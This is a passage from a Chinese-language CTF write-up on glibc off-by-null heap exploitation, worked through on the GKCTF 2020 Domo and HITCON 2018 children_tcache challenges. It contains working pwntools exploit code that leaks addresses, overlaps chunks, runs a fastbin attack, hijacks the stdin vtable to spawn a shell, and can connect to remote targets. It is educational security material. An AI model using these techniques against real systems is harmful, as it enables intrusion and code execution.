        if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
            malloc_printerr ("corrupted double-linked list");
        fd->bk = bk;
        bk->fd = fd;
        if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)
        {
            if (p->fd_nextsize->bk_nextsize != p || p->bk_nextsize->fd_nextsize != p)
                malloc_printerr ("corrupted double-linked list (not small)");
            if (fd->fd_nextsize == NULL)
            {
                if (p->fd_nextsize == p)
                    fd->fd_nextsize = fd->bk_nextsize = fd;
                else
                {
                    fd->fd_nextsize = p->fd_nextsize;
                    fd->bk_nextsize = p->bk_nextsize;
                    p->fd_nextsize->bk_nextsize = fd;
                    p->bk_nextsize->fd_nextsize = fd;
                }
            }
            else
            {
                p->fd_nextsize->bk_nextsize = p->bk_nextsize;
                p->bk_nextsize->fd_nextsize = p->fd_nextsize;
            }
        }
    }
和`GLIBC 2.27`相比，最明显的其实是整个宏定义被变更成了函数，其中的保护并没有发生更多的改变。
那么，事实上，真正对我们的利用产生阻碍的是之前合并操作变化，如果我们要继续完成利用，我们就需要修改 fake chunk 的 size
域，然而我们现在只有`Off-by-null`的利用条件是无法进行修改的，那么我们要利用就需要进行较为巧妙的堆布局构造，具体构造方式请查看例题。
## 0x03 以 2020 GKCTF Domo 为例
###  题目信息
保护全开，64位程序
###  漏洞分析
创建`Chunk`时存在一个`off-by-null`漏洞
⚠️：注意，此处是恒定存在一个空字节溢出，并不是在我们的输入后面加一个空字节！
###  漏洞利用
####  泄露有用信息
首先需要泄露一些有用的地址值，例如`Libc`、`Heap Addr`等
    creat(sh,0x100,'Chunk0')
    creat(sh,0x100,'Chunk1')
    creat(sh,0x40,'Chunk2')
    creat(sh,0x40,'Chunk3')
    creat(sh,0x100,'Chunk4')
    delete(sh,0)
    creat(sh,0x100,'Libc--->')
    show(sh,0)
    libc.address = get_address(sh=sh,info='LIBC ADDRESS IS ',start_string='Libc--->',end_string='x0A',offset=-0x3C4B78)
    delete(sh,3)
    delete(sh,2)
    creat(sh,0x40,'H')
    show(sh,2)
    heap_address = get_address(sh=sh,info='HEAP ADDRESS IS ',start_string='n',address_len=6,offset=-0x1238)
⚠️：注意，由于恒定存在一个空字节溢出，会导致我们泄露结束后导致某些`Chunk`的`size`域损坏！
#### 构造`Heap Overlap`
这里我们首先申请三个Chunk：
    creat(sh,0x100,'Chunk5')
    creat(sh,0x68,'Chunk6')
    creat(sh,0xF8,'Chunk7')
    creat(sh,0x100,'Chunk8') # 用于防止最后一个Chunk被Top Chunk吞并
依次释放掉`chunk 5`和`chunk 6`，然后重新申请一个`chunk 6`，触发`Off-by-null`，清除`Chunk
7`的`prev_inuse`位，同时伪造`chunk 7`的`prev_size`为`0x100+0x10+0x68+0x8`，最后释放`chunk
7`。
    delete(sh,5)
    delete(sh,6)
    creat(sh,0x68,'A'*0x60 + p64(0x70+0x110))
    delete(sh,7)
    creat(sh,0x270,'A') # Fake
####  Fastbin Attack & 劫持 vtable
接下来我们可以进行`Fastbin Attack`了，在这里我们决定使用篡改`_IO_2_1_stdin_`的`vtable`表的方式来完成利用
**⚠️：这里遇到了一个小坑，特此记录下，我们如果要使用`Fastbin
Attack`，我们需要在目标地址的头部附加一个`size`，于是我们这里可以使用题目给出的任意地址写来完成，然鹅，我们若传入了一个不合法的地址(没有写权限)，`read`不会抛出异常，而是会直接跳过，那么我们的输入将会残存在缓冲区，而程序在`main`函数是使用`_isoc99_scanf("%d",
&usr_choice);`来读取选项的，这导致残存在缓冲区的字符无法被取出，程序将进入死循环！**
我们的核心还是去伪造`vtable`，但是很不幸的，由于`Glibc-2.23`的`vtable`已经加入了只读保护，但我们可以直接自己写一个`fake_vtable`然后直接让`IO`结构体的`vtable`指向我们的`fake_vtable`即可。
首先我们需要在`IO`结构体的上方写一个`size`以便我们进行`Fastbin_Attack`：
    every_where_edit(sh,str(libc.symbols['_IO_2_1_stdin_'] - 0x8),'x71')
    delete(sh,2)
    creat(sh,0x120,'A' * 0x100 + p64(0x110) + p64(0x70) + p64(libc.symbols['_IO_2_1_stdin_'] - 0x10))
然后我们只需要伪造并劫持vtable即可
    creat(sh,0x100,p64(0) * 2 + p64(libc.address + 0xf02a4) * 19 + p64(0) * 3)
    creat(sh,0x60, 'Chunk')
    creat(sh,0x60, p64(0xffffffff) + "x00" * 0x10 + p64(heap_address + 0x4E0))
###  Final Exploit
    from pwn import *
    import traceback
    import sys
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    domo=ELF('./domo', checksec = False)
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    def get_sh(Use_other_libc = False , Use_ssh = False):
        global libc
        if args['REMOTE'] :
            if Use_other_libc :
                libc = ELF("./", checksec = False)
            if Use_ssh :
                s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
                return s.process("./domo")
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./domo")
    def creat(sh,chunk_size,value):
        sh.recvuntil('> ')
        sh.sendline('1')
        sh.recvuntil('size:n')
        sh.sendline(str(chunk_size))
        sh.recvuntil('content:n')
        sh.send(value)
    def delete(sh,index):
        sh.recvuntil('> ')
        sh.sendline('2')
        sh.recvuntil('index:n')
        sh.sendline(str(index))
    def show(sh,index):
        sh.recvuntil('> ')
        sh.sendline('3')
        sh.recvuntil('index:n')
        sh.sendline(str(index))
    def every_where_edit(sh,vuln_addr,vuln_byte):
        sh.recvuntil('> ')
        sh.sendline('4')
        sh.recvuntil('addr:n')
        sh.sendline(vuln_addr)
        sh.recvuntil('num:n')
        sh.send(vuln_byte)
    def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if int_mode :
            return_address = int(sh.recvuntil(end_string,drop=True),16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8,'x00'))
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh,gdbscript=None,stop=False):
        gdb.attach(sh,gdbscript=gdbscript)
        if stop :
            raw_input()
    def Multi_Attack():
        # testnokill.__main__()
        return
    def Attack(sh=None,ip=None,port=None):
        if ip != None and port !=None:
            try:
                sh = remote(ip,port)
            except:
                return 'ERROR : Can not connect to target server!'
        try:
            # Your Code here
            creat(sh,0x40,'Chunk0')
            creat(sh,0x40,'Chunk1')
            creat(sh,0xF8,'Chunk2')
            creat(sh,0xF8,'Chunk3')
            creat(sh,0x100,'Chunk4')
            creat(sh,0x100,'Chunk5')
            creat(sh,0x68,'Chunk6')
            creat(sh,0xF8,'Chunk7')
            creat(sh,0x100,'Chunk8')
            delete(sh,2)
            delete(sh,0)
            delete(sh,1)
            creat(sh,0x40,'H')
            show(sh,0)
            heap_address = get_address(sh=sh,info='HEAP ADDRESS IS ',start_string='',address_len=6,offset=-0x28)
            sh.sendline('3')
            sh.recvuntil('index:')
            sh.sendline('0')
            delete(sh,3)
            creat(sh,0xF8,'Libc--->')
            show(sh,1)
            libc.address = get_address(sh=sh,info='LIBC ADDRESS IS ',start_string='Libc--->',end_string='x0A',offset=-0x3C4D68)
            delete(sh,5)
            delete(sh,6)
            creat(sh,0x68,'A'*0x60 + p64(0x70+0x110))
            delete(sh,7)
            every_where_edit(sh,str(libc.symbols['_IO_2_1_stdin_'] + 0xB8),'x71')
            delete(sh,2)
            creat(sh,0x120,'A' * 0x100 + p64(0x110) + p64(0x70) + p64(libc.symbols['_IO_2_1_stdin_'] + 0xB0))
            creat(sh,0x100,p64(0) * 2 + p64(libc.address + 0xf02a4) * 19 + p64(0) * 3)
            creat(sh,0x60, 'Chunk')
            creat(sh,0x60, p64(0xffffffff) + "x00" * 0x10 + p64(heap_address + 0x4E0))
            sh.interactive()
            flag = get_flag(sh)
            sh.close()
            return flag
        except Exception as e:
            traceback.print_exc()
            sh.close()
            return 'ERROR : Runtime error!'
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(sh=sh)
        log.success('The flag is ' + re.search(r'flag{.+}',flag).group())
## 0x04 以 hitcon_2018_children_tcache 为例
###  题目信息
保护全开，64位程序，Glibc-2.27
###  漏洞分析
创建`Chunk`时，使用了`strcpy`函数，而这个函数会在将字符串转移后在末尾添加一个`x00`，因此此处存在一个`off-by-null`漏洞。
###  漏洞利用
#### 构造`Heap Overlap`
首先，这个题目中可以发现允许申请大小超过`0x400`的`chunk`，那么我们申请的大块就可以免受`Tcache`的影响，那么我们首先申请三个`chunk`用于攻击：
    creat(sh,0x480,'Chunk_0')
    creat(sh,0x78 ,'Chunk_1')
    creat(sh,0x4F0,'Chunk_2')
    creat(sh,0x20 ,'Chunk_3') # 用于防止最后一个Chunk被Top Chunk吞并
依次释放掉`chunk 0`和`chunk 1`，然后我们理论上就应该取回`chunk 1`来触发`Off-by-null`了，但是，需要注意的是，此处的释放函数有`memset(note_list[idx], 0xDA,
size_list[idx]);`，也就是说`xDA`将充斥整个数据空间，这会影响到我们后续的布置。
因此，我们先利用以下代码来清理`chunk 2`的`prev_size`域：
    for i in range(9):
        creat(sh, 0x78 - i, 'A' * (0x78 - i))
        delete(sh,0)
清理完之后，取回`chunk 1`并触发`Off-by-Null`：
    creat(sh,0x78,'B' * 0x70 + p64(0x480 + 0x10 + 0x70 + 0x10))
释放`Chunk 2`，`Heap Overlap`构造成功。
####  Leak Libc
解下来申请一个和原来的`Chunk 0`大小相同的`Chunk`，`main_arena`的地址将会被推到`Chunk
1`的数据域，于是可以得到`libc`基址。
    libc.address=get_address(sh=sh,info='LIBC ADDRESS --> ',